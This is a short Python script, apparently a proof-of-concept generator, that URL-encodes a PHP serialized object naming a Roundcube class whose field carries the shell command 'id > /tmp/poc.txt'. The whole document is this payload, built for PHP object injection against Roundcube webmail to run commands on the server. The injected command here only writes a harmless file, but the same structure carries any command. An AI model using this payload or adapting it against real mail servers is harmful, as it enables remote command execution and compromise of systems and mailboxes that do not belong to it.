import urllib.parse

payload = 'O:27:"rcube_washtml_mailto_handler":1:{s:4:"html";s:15:"id > /tmp/poc.txt";}'
print(urllib.parse.quote(payload))
